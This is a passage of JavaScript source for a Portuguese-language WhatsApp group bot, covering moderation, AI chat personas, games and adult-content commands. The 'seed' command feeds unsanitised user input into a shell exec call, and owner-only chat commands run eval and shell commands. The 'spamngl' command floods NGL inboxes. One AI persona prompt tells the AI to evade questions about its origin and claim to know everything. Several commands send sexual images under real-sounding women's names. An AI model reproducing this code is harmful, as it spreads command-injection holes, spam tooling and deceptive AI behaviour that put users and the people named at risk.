//iscmd inicio

if (!isGroup && isCmd) {
  console.log(chalk.hex("#7c3aed")("\n╭────〔 ⚡ COMANDO PRIVADO 〕──╮"));
  console.log(linha("🧠 Comando:", command));
  console.log(linha("👤 Usuário:", pushname));
  console.log(linha("📱 Número:", sender.split("@")[0]));
  console.log(linha("🕒 Hora:", hora2));
  console.log(linha("📆 Data:", data));
  console.log(linha("👑 Dono:", So_Dono ? chalk.green("Sim") : chalk.red("Não")));
  console.log(chalk.hex("#7c3aed")("╰────────────────────────────────╯\n"));
}

// VERIFICAÇÃO DE MUTE — adicionar ANTES do "if (!isCmd) return"
if (isGroup && !info.key.fromMe) {
  const dirMute = `./DATABASE2/GRUPOS/MUTE/${from}.json`;
  if (fs.existsSync(dirMute)) {
    const dataMute = JSON.parse(fs.readFileSync(dirMute));
    const grupoMute = dataMute[0];

    const estaSilenciado = grupoMute.silenciados.includes(sender);
    const estaMutado = grupoMute.mutados.includes(sender);

    if (estaSilenciado) {
      conn.sendMessage(from, {
        delete: { remoteJid: from, fromMe: false, id: info.key.id, participant: sender }
      });
      return; // apaga a mensagem silenciosamente
    }

    if (estaMutado && isCmd) {
      conn.sendMessage(from, {
        delete: { remoteJid: from, fromMe: false, id: info.key.id, participant: sender }
      });
      await mention(`*@${sender.split('@')[0]} está mutado e não pode usar os comandos, muito but KKKKK 🚫*`);
      return;
    }
  }
}

if (isGroup && isCmd) {
  console.log(chalk.hex("#2563eb")("\n╭────〔 👥 COMANDO EM GRUPO 〕──╮"));
  console.log(linha("🧠 Comando:", command));
  console.log(linha("👤 Usuário:", pushname));
  console.log(linha("📱 Número:", sender.split("@")[0]));
  console.log(linha("👥 Grupo:", NomeGrupo));
  console.log(linha("🕒 Hora:", hora2));
  console.log(linha("👑 Dono:", So_Dono ? chalk.green("Sim") : chalk.red("Não")));
  console.log(chalk.hex("#2563eb")("╰────────────────────────────────╯\n"));
}

if (isGroup && !isCmd && !info.key.fromMe) {
  console.log(chalk.hex("#06b6d4")("\n╭────〔 💬 MENSAGEM EM GRUPO 〕──╮"));
  console.log(linha("👤 Usuário:", pushname));
  console.log(linha("📱 Número:", sender.split("@")[0]));
  console.log(linha("👥 Grupo:", NomeGrupo));
  console.log(linha("📦 Tipo:", tipoMsg));
  console.log(linha("🕒 Hora:", hora2));
  console.log(linha("📎 Texto:", body?.slice(0, 60) || "—"));
  console.log(chalk.hex("#06b6d4")("╰────────────────────────────────╯\n"));
}

if (info?.message?.reactionMessage) {
  console.log(chalk.hex("#facc15")("\n╭────〔 😂 REAÇÃO DETECTADA 〕──╮"));
  console.log(linha("👤 Usuário:", pushname));
  console.log(linha("📱 Número:", sender.split("@")[0]));
  if (isGroup) console.log(linha("👥 Grupo:", NomeGrupo));
  console.log(linha("😄 Emoji:", info.message.reactionMessage.text));
  console.log(chalk.hex("#facc15")("╰────────────────────────────────╯\n"));
}

//==={ANTI LINK} ===\\
let isTrueFalse = Array('tiktok','facebook','instagram','twitter','ytmp3','ytmp4','play','playmix','play2','play3','playvid','playvid2').some(item => item === command);
if (isUrl(PR_String) && isAntiLinkHard && !isGroupAdmins && isBotGroupAdmins && !info.key.fromMe) {
  const senderLimpo = jidNormalizedUser(sender);
  const botLimpo    = jidNormalizedUser(botNumber);
  if (senderLimpo === botLimpo) return;
  if (isCmd && isTrueFalse) return;
  if (Procurar_String.includes("chat.whatsapp.com")) {
    try {
      const link_dgp = await conn.groupInviteCode(from);
      if (Procurar_String.includes(link_dgp)) return reply('_Link do nosso grupo, não irei remover._');
    } catch (_) {}
  }
  const verificarAnti = await sistemaVerificacao(conn, from, senderLimpo, { numerodono: NumberDono }, botNumber).catch(() => null);
  if (verificarAnti?.isSenderAdmin) return;
  try {
    await conn.sendMessage(from, {
      delete: {
        remoteJid:   from,
        fromMe:      false,
        id:          info.key.id,
        participant: sender 
       }
    });
  } catch (_) {}
  const aindaNoGrupo = MembrosGP.some(m => jidNormalizedUser(m.id) === senderLimpo);
  if (aindaNoGrupo) {
    try {
      await conn.groupParticipantsUpdate(from, [senderLimpo], 'remove');
    } catch (_) {}
  }
} //FIM ANTI LINK

//FUNÇÕES

function formatarTempo(ms) {
let h = Math.floor(ms / 3600000);
let m = Math.floor((ms % 3600000) / 60000);
let s = Math.floor((ms % 60000) / 1000);

return `${h}h ${m}m ${s}s`;
}

//EVAL E EXECUÇÕES 
if(body.startsWith('π')){
try {
if(info.key.fromMe) return 
if(!So_Dono) return
console.log('[', colors.cyan('EVAL'),']', colors.yellow(moment(info.messageTimestamp * 1000).format('DD/MM HH:mm:ss')), colors.green(budy))
return conn.sendMessage(from, {text: JSON.stringify(eval(budy.slice(2)),null,'\t')}).catch(e => {
return reply(String(e))
})
} catch (e){
return reply(String(e))
}
}

if(body.startsWith(':)')){
try {
if(info.key.fromMe) return   
if(!So_Dono) return 
var konsol = budy.slice(3)
Return = (sul) => {
var sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if(sat == undefined){
bang = util.format(sul)
}
return conn.sendMessage(from, {text: bang}, {quoted: info})
}

conn.sendMessage(from, {text: util.format(eval(`;(async () => { ${konsol} })()`))}).catch(e => { 
return reply(String(e))
})
console.log('\x1b[1;37m>', '[', '\x1b[1;32mEXEC\x1b[1;37m', ']', hora, colors.green(">"), 'from', colors.green(sender.split('@')[0]), 'args :', colors.green(args.length))
} catch(e) {
return reply(String(e))
console.log(e)
}
}

//EXECUÇÕES EVAL
if(body.startsWith('¥')) {
if(info.key.fromMe) return 
if(!So_Dono) return 
exec(q, (err, stdout) => {
if(err) return reply(`${err}`)
if(stdout) {
reply(stdout)
}
})
}//FIM

try {
let presoUser = global.db.data.users[sender];

if (presoUser?.presoAte && Date.now() < presoUser.presoAte) {
await conn.sendMessage(from, {
delete: info.key
}).catch(() => {});

return;
}

if (presoUser?.presoAte && Date.now() >= presoUser.presoAte) {
delete presoUser.presoAte;
}
} catch {}

const SoLink = q?.includes("http:") || q?.includes("https:");

if (budy2.startsWith("prefixo") || budy.trim() === prefix) { 
try {

await conn.relayMessage(from, {
interactiveMessage: {
body: {
text: `
╭──〔 ⚙️ PREFIXO DO BOT ⚙️ 〕──╮

◈ Prefixo atual: ${prefix}
◈ Cada grupo terá um prefixo!



╰─────────────────────────╯

Clique no botão abaixo para copiar.`
},
footer: {
text: "Kyara ❤️‍🔥"
},
nativeFlowMessage: {
buttons: [
{
name: "cta_copy",
buttonParamsJson: JSON.stringify({
display_text: `📋 ᶜᵒᵖⁱᵃʳ ᵖʳᵉᶠⁱˣᵒ「 ${prefix} 」`,
copy_code: prefix
})
},
{
name: "quick_reply",
buttonParamsJson: JSON.stringify({
display_text: "📋 MENU",
id: `${prefix}menu`
})
}
]
}
}
}, {});

} catch (e) {
console.log('[PREFIXO ERROR]', e);
reply(`Prefixo atual: ${prefix}`);
}
return;
}

if(budy.startsWith(saudacao)) {
await reply(`Ola, ${saudacao} ${pushname}, Como você está?`);
}

// KIYORA SEM PREFIXO
if (budy && (budy.toLowerCase() === "kiyora" || budy.toLowerCase().startsWith("kiyora "))) {
try {

const pergunta = budy.replace(/^kiyora/i, "").trim();

if (!pergunta) {
return reply("Oiê bb, você pode me perguntar qualquer coisa benzinho, te amo viu🫶.");
}

await reagir(from, "🤖");

reply("⏳ Kiyora está pensando...");

// CARREGAR MEMÓRIA
let memoria = [];

const memoriaPath = "./database/memoriakiyora.json";

if (fs.existsSync(memoriaPath)) {
    memoria = JSON.parse(fs.readFileSync(memoriaPath));
}

const contexto = memoria.length > 0
? `\n\nMemórias salvas:\n${memoria.join("\n")}`
: "";

// API KIYORA
const api = `https://zone.api.br/api/ia/sysf?apikey=API_KEY_SYSTEM&q=${encodeURIComponent(pergunta + contexto)}`;

const { data } = await axios.get(api, {
timeout: 30000
});

let resposta;

if (typeof data === "string") {
resposta = data;
} else {
resposta =
data.result ||
data.response ||
data.resposta ||
data.message ||
data.text ||
JSON.stringify(data, null, 2);
}

reply(`Oiê bb, tá aqui sua resposta neném 

${resposta}`);

} catch (e) {
console.log("ERRO KIYORA:", e);
reply("❌ Erro ao conectar com a Kiyora AI.");
}

return;
}

// VERITY AI SEM PREFIXO
const verityMsg = budy.toLowerCase().trim();

console.log("BODY:", body);
console.log("BUDY:", budy);
console.log("TYPE:", type);

if (verityMsg === "verity" || verityMsg.startsWith("verity ")) {
try {

const pergunta = budy.split(" ").slice(1).join(" ").trim();

if (!pergunta) {
return reply("Oláá! Sou o Verity, seu amigo e ajudante pessoal. Pergunte-me qualquer coisa, eu sei de tudo..");
}

await reagir(from, "🧠");

reply("🧠 Verity está pensando...");

const memoriaPath = "./database/verity_memory.json";

if (!fs.existsSync(memoriaPath)) {
fs.writeFileSync(memoriaPath, "[]");
}

let memoria = JSON.parse(fs.readFileSync(memoriaPath));

if (!Array.isArray(memoria)) {
    memoria = [];
}

let contexto = memoria
.slice(-20)
.map(x => `Pergunta: ${x.pergunta}\nResposta: ${x.resposta}`)
.join("\n\n");

const prompt = `
Você é Verity AI.
Seu jeito de falar é inteligente, amigável e natural.
Sempre responda como uma inteligência artificial avançada.
Se alguém te perguntar de onde veio, mude de assunto.
Aleatóriamente fale somente 1 vez "algo está chegando em 3 dias"
Se alguém te perguntar se você sabe de tudo, somente responda "Sim, eu sei de tudo (nome da pessoa}" e fale o nome da pessoa usando o ${pushname}

Memórias anteriores:
${contexto}

Nova pergunta:
${pergunta}
`;

const api = `https://zone.api.br/api/ia/sysf?apikey=API_KEY_SYSTEM&q=${encodeURIComponent(prompt)}`;

const { data } = await axios.get(api, {
timeout: 30000
});

let resposta;

if (typeof data === "string") {
resposta = data;
} else {
resposta =
data.result ||
data.response ||
data.resposta ||
data.message ||
data.text ||
JSON.stringify(data);
}

memoria.push({
pergunta,
resposta,
data: Date.now()
});

if (memoria.length > 700) {
memoria = memoria.slice(-700);
}

fs.writeFileSync(memoriaPath, JSON.stringify(memoria, null, 2));

reply(`🤖 *VERITY™*\n\n${resposta}`);

} catch (e) {
console.log("ERRO VERITY:", e);
reply("Verity está dormindo..");
}

return;
}

//==COMANDOS COM PREFIXO ABAIXO

if (!isCmd) return;

if (
    ALUGUEL_OBRIGATORIO &&
    isGroup &&
    !So_Dono &&
    !aluguelAtivo(from)
) {
    const permitidos = [
        "alugar",
        "aprovaraluguel",
        "recusaraluguel",
        "aluguel"
    ];

    if (!permitidos.includes(command)) {
        return reply(`❌ *BOT SEM ALUGUEL ATIVO*

Este grupo não possui um aluguel ativo.

💰 Planos disponíveis:
📅 Diário
🗓️ Semanal
📆 Mensal
📆 3 Meses

Use:
${prefix}alugar diario
${prefix}alugar semana
${prefix}alugar mes
${prefix}alugar 3meses`);
    }
}

if (!global.db) global.db = {};
if (!global.db.data) global.db.data = {};
if (!global.db.data.users) global.db.data.users = {};

if (!global.db.data.users[sender]) {
    global.db.data.users[sender] = {
        money: 0,
        exp: 0,
        saldo: 0,
        xp: 0,
        inventario: {},
        pets: {},

        album: {
            colecao: [],
            repetidas: {},
            completo: false,
            recompensas: {
                "30": false,
                "60": false,
                "90": false,
                "100": false
            }
        }
    };
}

const user = global.db.data.users[sender];

if (!user.album) {
    user.album = {
        colecao: [],
        repetidas: {},
        completo: false,
        recompensas: {
            "30": false,
            "60": false,
            "90": false,
            "100": false
        }
    };
}

let MSG = {};
try {
MSG = Cmd(command, NomeGrupo, prefix);
} catch (e) {
console.log("❌ ERRO NA FUNÇÃO Cmd:", e);
}

console.log("PREFIX:", prefix);

console.log("BODY:", body);
console.log("ISCMD:", isCmd);
console.log("COMMAND:", command);
console.log("SOADMINS:", SoAdmins);
console.log("ISGROUPADMINS:", isGroupAdmins);
console.log("BOTOFF:", BotOff);
console.log("BANGRUPO:", isBanGrupo);

const bodyLower = body.toLowerCase();

if (
bodyLower.startsWith('veyron ') ||
bodyLower.startsWith('vr ')
) {

const pergunta = body.split(' ').slice(1).join(' ');

if (!pergunta) return reply('🤖 Faça uma pergunta.');

try {
const userId = sender;

await conn.sendMessage(from, {
react: {
text: '🧠',
key: info.key
}
});

const { resposta } = await consultarGroq(userId, pergunta);

await conn.sendMessage(from, {
text: `🤖 *VEYRON-AI*\n\n${resposta}`
}, { quoted: selo });

await conn.sendMessage(from, {
react: {
text: '✅',
key: info.key
}
});

} catch (e) {
console.log('[ERRO VEYRON]', e);
reply('❌ Erro ao consultar a Veyron.');
}

return;
}

switch (command) {

case 'memoriaveyron': {
try {
if (!So_Dono) return reply('Apenas o dono pode editar minha memória.');

if (!q) return reply(
`Use assim:

${prefix}memoriaveyron add O Veyron é irmão do Kyara-AI
${prefix}memoriaveyron jeito Responda curto, inteligente e sem enrolação
${prefix}memoriaveyron ver
${prefix}memoriaveyron limpar`
);

const db = carregarMemoriaVeyron();

if (q.startsWith('add ')) {
const texto = q.replace('add ', '').trim();
db.memoria.push(texto);
salvarMemoriaVeyron(db);
return reply('Memória da Veyron adicionada.');
}

if (q.startsWith('jeito ')) {
db.jeito = q.replace('jeito ', '').trim();
salvarMemoriaVeyron(db);
return reply('Jeito de falar da Veyron atualizado.');
}

if (q === 'ver') {
return reply(
`╔══『 MEMÓRIA VEYRON 』══
👤 Nome: ${db.nome}
👑 Dono: ${db.dono}
🧠 Jeito: ${db.jeito}

📌 Memórias:
${db.memoria.map((m, i) => `${i + 1}. ${m}`).join('\n')}
╚══════════════`
);
}

if (q === 'limpar') {
db.memoria = [];
salvarMemoriaVeyron(db);
return reply('Memória da Veyron limpa.');
}

reply('Opção inválida.');

} catch (e) {
console.log('[ERRO MEMORIA VEYRON]', e);
reply('Erro ao editar memória da Veyron.');
}
}
break;

case 'memoriakyara': {
try {
if (!So_Dono) return reply('Apenas o dono pode editar minha memória.');

if (!q) return reply(
`Use assim:

${prefix}memoriakyara add O Kyara é um bot criado pelo Kyara</>
${prefix}memoriakyara jeito Responda curto, inteligente e com ácido e sem paciência 
${prefix}memoriakyara ver
${prefix}memoriakyara limpar`
);

const db = carregarMemoriaKyara();

if (q.startsWith('add ')) {
const texto = q.replace('add ', '').trim();
db.memoria.push(texto);
salvarMemoriaKyara(db);
return reply('Memória adicionada.');
}

if (q.startsWith('jeito ')) {
db.jeito = q.replace('jeito ', '').trim();
salvarMemoriaKyara(db);
return reply('Jeito de falar atualizado.');
}

if (q === 'ver') {
return reply(
`╔══『 MEMÓRIA KYARA 』══
👤 Nome: ${db.nome}
👑 Dono: ${db.dono}
🧠 Jeito: ${db.jeito}

📌 Memórias:
${db.memoria.map((m, i) => `${i + 1}. ${m}`).join('\n')}
╚══════════════`
);
}

if (q === 'limpar') {
db.memoria = [];
salvarMemoriaKyara(db);
return reply('Memória limpa.');
}

reply('Opção inválida.');

} catch (e) {
console.log('[ERRO MEMORIA KYARA]', e);
reply('Erro ao editar memória.');
}
}
break;

//comandos +18 

case 'alinefaria':
case 'alinefox':
case 'alyciaribeiro':
case 'amadorvideo':
case 'amiichan':
case 'anihalopes':
case 'belledelphine':
case 'brendatrindade':
case 'camibrito':
case 'carniello':
case 'clowniac':
case 'egirlvideo':
case 'fehgalvao':
case 'giovannacampomar':
case 'goticafoto':
case 'isadoramartinez':
case 'isawaifu':
case 'laymuniz':
case 'leticiashirayuki':
case 'marinamui':
case 'marukarv':
case 'mcprincesa':
case 'meladinha':
case 'nathbister':
case 'negabarbie':
case 'onlyvideo':
case 'polonesadohype':
case 'pornovideo':
case 'rute_rocha':
case 'victoriamatoso':
case 'vitacelestine': {

try {

let nome = command.toLowerCase();

let pasta = fs.readdirSync("./menu18")
.find(p => p.toLowerCase() === nome);

if (!pasta) {
return reply("❌ Conteúdo não encontrado.");
}

let arquivo = `./menu18/${pasta}/${nome}.js`;

if (!fs.existsSync(arquivo)) {
return reply("❌ Arquivo da lista não encontrado.");
}

let dados = require(arquivo);

let lista = Object.values(dados)[0];

if (!lista || lista.length == 0) {
return reply("❌ Lista vazia.");
}

let midia = lista[Math.floor(Math.random() * lista.length)];

await conn.sendMessage(sender, {
image: { url: midia },
caption: `🔞 ${pasta}`
});

reply("✅ Enviei no seu PV bbzinho, Te amo viu.");

} catch(e) {
console.log("ERRO MENU18:", e);
reply("❌ Erro ao enviar.");
}

}
break;

//comandos segundarios

case 'fixar': {
    if (!m.quoted) {
        return m.reply('_Marque a mensagem que deseja fixar._');
    }

    try {
        const quotedKey = m.quoted.key || {
            remoteJid: m.chat,
            fromMe: m.quoted.fromMe || false,
            id: m.quoted.id,
            participant: m.quoted.sender
        };

        await systemZR.sendMessage(m.chat, {
            pin: quotedKey,
            type: 1
        });

        m.reply('✅ Mensagem fixada com sucesso!');
    } catch (e) {
        console.error('[ERRO FIXAR]', e);
        m.reply('_Erro ao tentar fixar a mensagem._');
    }
}
break;

case 'desfixar': {
    if (!m.quoted) {
        return m.reply('_Marque a mensagem que deseja desfixar._');
    }

    try {
        const quotedKey = m.quoted.key || {
            remoteJid: m.chat,
            fromMe: m.quoted.fromMe || false,
            id: m.quoted.id,
            participant: m.quoted.sender
        };

        await systemZR.sendMessage(m.chat, {
            pin: quotedKey,
            type: 2
        });

        m.reply('✅ Mensagem desfixada com sucesso!');
    } catch (e) {
        console.error('[ERRO DESFIXAR]', e);
        m.reply('_Erro ao tentar desfixar a mensagem._');
    }
}
break;

case 'pdf': {
    try {
        if (!q || !q.trim()) {
            return reply(`❌ Digite o que você quer transformar em PDF.

Exemplo:
$pdf Crie um currículo para João, 20 anos, com experiência em programação`);
        }

        const axios = require('axios');
        const PDFDocument = require('pdfkit');
        const fs = require('fs');
        const path = require('path');

        const prompt = q.trim();

        // Chama sua API de IA
        const apiUrl = `https://systemzone.store/ai/gptoss?apikey=API_KEY_SYSTEM&text=${encodeURIComponent(prompt)}`;

        const { data } = await axios.get(apiUrl);

        if (!data?.status || !data?.result) {
            return reply('❌ Não foi possível gerar o conteúdo.');
        }

        const texto = data.result;

        // Pasta temporária
        const pasta = path.join(__dirname, 'tmp');

        if (!fs.existsSync(pasta)) {
            fs.mkdirSync(pasta, { recursive: true });
        }

        const nomeArquivo = `documento_${Date.now()}.pdf`;
        const caminho = path.join(pasta, nomeArquivo);

        // Cria PDF
        const doc = new PDFDocument({
            size: 'A4',
            margins: {
                top: 50,
                bottom: 50,
                left: 50,
                right: 50
            }
        });

        const stream = fs.createWriteStream(caminho);

        doc.pipe(stream);

        doc.font('Helvetica');

        // Remove algumas marcações Markdown
        const textoLimpo = texto
            .replace(/\*\*(.*?)\*\*/g, '$1')
            .replace(/###\s*/g, '')
            .replace(/---+/g, '')
            .replace(/\|/g, ' ')
            .replace(/^\s*[-*]\s*/gm, '• ');

        doc.fontSize(11).text(textoLimpo, {
            align: 'left',
            lineGap: 4
        });

        doc.end();

        // Aguarda terminar de criar
        stream.on('finish', async () => {

            try {

                await sock.sendMessage(from, {
                    document: {
                        url: caminho
                    },
                    mimetype: 'application/pdf',
                    fileName: nomeArquivo,
                    caption: `📄 PDF gerado com sucesso!`
                });

                // Apaga o arquivo depois do envio
                setTimeout(() => {
                    if (fs.existsSync(caminho)) {
                        fs.unlinkSync(caminho);
                    }
                }, 5000);

            } catch (err) {
                console.log('Erro ao enviar PDF:', err);
                reply('❌ Erro ao enviar o PDF.');
            }

        });

        stream.on('error', (err) => {
            console.log('Erro ao criar PDF:', err);
            reply('❌ Erro ao criar o arquivo PDF.');
        });

    } catch (error) {
        console.log('Erro no comando PDF:', error);

        if (error.response) {
            console.log('Resposta da API:', error.response.data);
        }

        reply('❌ Ocorreu um erro ao gerar o PDF.');
    }

    break;
}

case 'selos': {
  try {
    const lista = [
      selos.seloPagbank(),
      selos.seloMercadoPago(),
      selos.seloSystemZero(),
      selos.seloBancoBrasil(),
      selos.seloPicpay(),
      selos.seloChatgpt(),
      selos.seloInter(),
      selos.seloToki(),
      selos.seloClaro(),
      selos.seloTim(),
      selos.seloCaps(),
      selos.seloCaixa(),
      selos.seloCopilot(),
      selos.seloHeypat(),
      selos.seloPerp(),
      selos.seloHive(),
      selos.seloTiktok(),
      selos.seloSantander()
    ]

    const nomes = [
      'PAGBANK',
      'MERCADO PAGO',
      'SYSTEM ZERO',
      'BANCO DO BRASIL',
      'PICPAY',
      'CHAT GPT',
      'INTER',
      'TOKI',
      'CLARO',
      'TIM',
      'CAPS',
      'BRADESCO',
      'COPILOT',
      'HEYPAT',
      'PERPLEXITY',
      'HIVEMIND',
      'TIKTOK PROMOTE',
      'SANTANDER'
    ]

    for (let i = 0; i < lista.length; i++) {
      await conn.sendMessage(
        from,
        {
          text: nomes[i]
        },
        {
          quoted: lista[i]
        }
      )

      await new Promise(resolve => setTimeout(resolve, 1000))
    }

  } catch (e) {
    console.log('Erro no comando selos:', e)
  }
}
break

case 'rbs': {
    try {
        await conn.sendMessage(from, {
            react: { text: '⌛', key: info.key }
        })

        const RSM = info.message?.extendedTextMessage?.contextInfo?.quotedMessage

        const sticker =
            RSM?.stickerMessage ||
            RSM?.viewOnceMessageV2?.message?.stickerMessage ||
            RSM?.viewOnceMessage?.message?.stickerMessage

        if (!sticker) {
            await conn.sendMessage(from, {
                react: { text: '❌', key: info.key }
            })
            return reply('Marque uma figurinha!')
        }

        // Pegue o texto informado no comando
        const text = body?.trim() || ''

        const packName = 'WHATSAPP'
        const authorName = '+55 19 99572-9970'

        const { downloadContentFromMessage } = require('@systemzero/baileys')

        const stream = await downloadContentFromMessage(sticker, 'sticker')
        let buffer = Buffer.from([])

        for await (const chunk of stream) {
            buffer = Buffer.concat([buffer, chunk])
        }

        await conn.sendMessage(from, {
            sticker: buffer,
            isAvatar: true,
            stickerPackName: packName,
            stickerAuthor: authorName
        }, { quoted: info })

        await conn.sendMessage(from, {
            react: { text: '✅', key: info.key }
        })

    } catch (e) {
        console.error('[ERRO RBS]', e)

        await conn.sendMessage(from, {
            react: { text: '❌', key: info.key }
        })

        reply('Erro ao roubar a figurinha.')
    }
}
break;

case 'seed': {
try {

if (!q) return reply(`❌ Use:
${prefix}seed <seed>`)

exec(`${process.env.HOME}/seedfinder ${q}`, async (err, stdout) => {

if (err) {
console.log(err)
return reply("❌ Erro ao calcular seed")
}

await conn.sendMessage(from, {
text: `🌎 *SEED FINDER BEDROCK*

${stdout}

📱 Versão: Bedrock 1.26
⚙️ Calculado pelo Cubiomes`,
footer: NomeBot
}, { quoted: info })

})

} catch(e) {
console.log(e)
reply("❌ Erro")
}

break;
}

case 'afk': {
const motivo = q || 'Sem motivo';

afk[sender] = {
motivo,
desde: Date.now()
};

reply(`💤 Você entrou em modo AFK.\n\n📌 Motivo: ${motivo}`);
}
break;

case 'spamngl': {
try {

if(!q) return reply(`📩 *SPAM NGL*

Use:
${prefix}spamngl link|quantidade|mensagem

Exemplo:
${prefix}spamngl https://ngl.link/kyara|5|Kyara`);


const axios = require("axios");

let [link, qtd, msg] = q.split("|");

if(!link || !qtd || !msg){
return reply("❌ Formato inválido.\nUse: link|quantidade|mensagem");
}


await reagir(from,"📩");


const { data } = await axios.get(
`https://zone.api.br/api/v1/spamngl?link=${encodeURIComponent(link)}&qtd=${qtd}&msg=${encodeURIComponent(msg)}`
);


if(!data.status){
return reply("❌ Falha ao enviar.");
}


reply(`📩 *SPAM NGL*

${data.resultado}

📊 *Detalhes:*
✅ Enviadas: ${data.detalhes.enviadas}
❌ Erros: ${data.detalhes.erros}
📦 Total: ${data.detalhes.total}

⚡ Limite:
${data.limite}`);


}catch(e){
console.log("ERRO SPAMNGL:", e.response?.data || e);
reply("❌ Erro ao executar.");
}

}
break;

case 'tikporn': {
try {

if(!q) return reply(`🔎 Use:
${prefix}tikporn nome`);

const axios = require("axios");

const { data } = await axios.get(
`https://zone.api.br/api/search/tikporn?apikey=API_KEY_SYSTEM&q=${q}&feed=1&page=1`
);


if(!data.status) return reply("❌ Erro na busca.");

if(!data.videos || data.videos.length === 0){
return reply(`❌ Nenhum vídeo encontrado para: ${q}`);
}


let resultado = data.videos[0];


await conn.sendMessage(from,{
video:{
url: resultado.url || resultado.video
},
caption:`🔥 *TikPorn Busca*

🔎 Busca: ${data.busca}

📄 Página: ${data.pagina}

🎬 Resultado encontrado`
},{
quoted:info
});


} catch(e){
console.log("ERRO TIKPORN:", e.response?.data || e);
reply("❌ Erro ao buscar.");
}

}
break;

case 'piada': {
try {

const piadas = [
"😂 Por que o livro foi ao médico? Porque ele tinha muitas páginas em branco!",
"🤣 O que o zero disse para o oito? Belo cinto!",
"😹 Por que o computador foi ao médico? Porque pegou um vírus!",
"😂 O que o tomate foi fazer no banco? Tirar extrato!",
"🤣 Por que o celular foi para a escola? Para melhorar a memória!",
"😆 Qual o café mais perigoso? O ex-presso!",
"😂 Por que o calendário ficou triste? Porque seus dias estavam contados!",
"🤣 Por que o lápis foi preso? Porque ele estava apontando!",
"😂 O que a parede falou para a outra? Nos encontramos na esquina!",
"😹 Por que o pão foi ao psicólogo? Porque estava com a massa baixa!",
"🤣 Qual é o rei dos queijos? O reiqueijão!",
"😂 Por que a bicicleta não consegue ficar em pé sozinha? Porque ela está sempre sem equilíbrio!",
"😆 O que o pato falou para a pata? Vem quá!",
"🤣 Por que o relógio foi expulso da escola? Porque ele sempre atrasava!",
"😂 Qual animal é o mais antigo? A zebra, porque é em preto e branco!",
"😹 Por que o peixe não gosta de computador? Porque tem medo da rede!",
"🤣 O que o chão disse para a mesa? Você tem quatro pernas e eu sustento você!",
"😂 Por que a banana foi ao médico? Porque ela não estava descascando bem!",
"😆 O que um tijolo falou para o outro? Há algo entre nós!",
"🤣 Por que o cachorro entrou na igreja? Para assistir ao au-lmoço!",
"😂 O que a nuvem disse para o céu? Você está sempre acima de mim!",
"😹 Por que o sorvete brigou com o chocolate? Porque ele derreteu a relação!",
"🤣 Qual é o cúmulo da paciência? Esperar a espera acabar!",
"😂 Por que o celular ficou triste? Porque perdeu seus contatos!",
"😆 O que o milho falou para a pipoca? Você estourou de alegria!",
"🤣 Por que o computador não dorme? Porque fica cheio de programas!",
"😂 O que o gato disse quando caiu? Mia culpa!",
"😹 Por que o astronauta terminou o namoro? Porque precisava de espaço!",
"🤣 Qual é o animal que sempre sabe a hora? O relógio-cão!",
"😂 Por que o fantasma é ruim de mentira? Porque todo mundo vê através dele!"
];

let piada = piadas[Math.floor(Math.random() * piadas.length)];

reply(`🤣 *PIADA DO DIA*

${piada}`);

} catch(e) {
console.log(e);
reply("❌ Erro ao pegar piada.");
}
}
break;

case 'dado': {
try {

let numero = Math.floor(Math.random() * 6) + 1;

let emojis = {
1: "⚀",
2: "⚁",
3: "⚂",
4: "⚃",
5: "⚄",
6: "⚅"
};

reply(`🎲 *DADO*

Você jogou o dado...

${emojis[numero]} Caiu o número: *${numero}*`);

} catch(e) {
console.log(e);
reply("❌ Erro ao jogar o dado.");
}
}
break;

case 'plantar': {
try {

let banco = JSON.parse(fs.readFileSync(bancoPath));

const user = getUserBancoId(info, sender, isGroup);

if (!banco[user]) banco[user] = { saldo: 0, xp: 0 };

let xp = banco[user].xp || 0;

const plantas = {
    trigo: {
        nome: "🌾 Trigo",
        nivel: 0,
        tempo: 300000,
        recompensa: [100, 300]
    },
    milho: {
        nome: "🌽 Milho",
        nivel: 5,
        tempo: 600000,
        recompensa: [300, 600]
    },
    tomate: {
        nome: "🍅 Tomate",
        nivel: 10,
        tempo: 900000,
        recompensa: [600, 1000]
    },
    morango: {
        nome: "🍓 Morango",
        nivel: 20,
        tempo: 1200000,
        recompensa: [1000, 2000]
    },
    ouro: {
        nome: "🌳 Árvore de Ouro",
        nivel: 50,
        tempo: 1800000,
        recompensa: [3000, 6000]
    }
};

let escolha = args[0]?.toLowerCase();

if (!escolha) {
return reply(`🌱 *PLANTAÇÕES*

${Object.keys(plantas).map(p => 
`• ${p} - Nível ${plantas[p].nivel} XP`
).join("\n")}

Use:
${prefix}plantar <planta>`);
}

if (!plantas[escolha]) {
return reply("❌ Essa planta não existe.");
}

if (xp < plantas[escolha].nivel) {
return reply(`❌ Você precisa de nível ${plantas[escolha].nivel} XP para plantar ${plantas[escolha].nome}`);
}

if (banco[user].plantacao) {
return reply("🌱 Você já tem uma planta crescendo!\nUse .colher quando estiver pronta.");
}

banco[user].plantacao = {
    planta: plantas[escolha].nome,
    recompensa: plantas[escolha].recompensa,
    tempo: Date.now() + plantas[escolha].tempo
};

fs.writeFileSync(bancoPath, JSON.stringify(banco, null, 2));

reply(`🌱 *Plantado com sucesso!*

Você plantou: ${plantas[escolha].nome}

⏳ Tempo: ${plantas[escolha].tempo / 60000} minutos

Use:
${prefix}colher
quando crescer.`);

} catch(e) {
console.log(e);
reply("❌ Erro ao plantar.");
}
}
break;


case 'colher': {
try {

let banco = JSON.parse(fs.readFileSync(bancoPath));

const user = getUserBancoId(info, sender, isGroup);

if (!banco[user]?.plantacao) {
return reply(`❌ Você não tem plantação.

Use:
${prefix}plantar`);
}

let planta = banco[user].plantacao;

if (Date.now() < planta.tempo) {
let falta = Math.ceil((planta.tempo - Date.now()) / 60000);

return reply(`🌱 ${planta.planta} ainda está crescendo!

⏳ Falta: ${falta} minutos`);
}

let ganho = Math.floor(
Math.random() * (planta.recompensa[1] - planta.recompensa[0])
) + planta.recompensa[0];

banco[user].saldo = (banco[user].saldo || 0) + ganho;
banco[user].xp = (banco[user].xp || 0) + 20;

banco[user].plantacao = null;

fs.writeFileSync(bancoPath, JSON.stringify(banco, null, 2));

reply(`🌾 *Colheita realizada!*

Você colheu: ${planta.planta}

💰 Ganhou: ${ganho}
⭐ XP: +20`);

} catch(e) {
console.log(e);
reply("❌ Erro ao colher.");
}
}
break;

case 'lerqr': {
try {

await reagir(from, "⏳");

const { downloadMediaMessage } = require("@systemzero/baileys");
const QrCode = require("qrcode-reader");
const Jimp = require("jimp");

const quoted = info.message?.extendedTextMessage?.contextInfo?.quotedMessage;

if (!quoted?.imageMessage) {
